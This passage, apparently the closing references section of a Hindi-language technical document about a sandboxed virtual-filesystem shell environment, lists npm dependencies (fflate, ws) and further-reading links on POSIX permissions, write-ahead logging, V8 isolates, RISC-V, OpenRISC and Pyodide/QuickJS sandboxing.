- **`fflate`** (VFS snapshot संपीड़न) , npm : [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (WebSocket shell transport) , npm : [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### आगे पढ़ना

- **POSIX अनुमति मॉडल** , Open Group विनिर्देश : [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-ahead logging** (VFS स्थायित्व में इस्तेमाल pattern) , [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **V8 Isolate मॉडल** , "Embedder's Guide" : [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **RISC-V ISA विनिर्देश** (TinyEMU/JSLinux संदर्भ के लिए) , [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **OpenRISC 1000 आर्किटेक्चर** , [opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"** , Simon Willison TIL, Wasm दृष्टिकोण से उपयोगी विरोध : [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"** , quickjs-emscripten bundle आकार पर Simon Willison TIL : [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
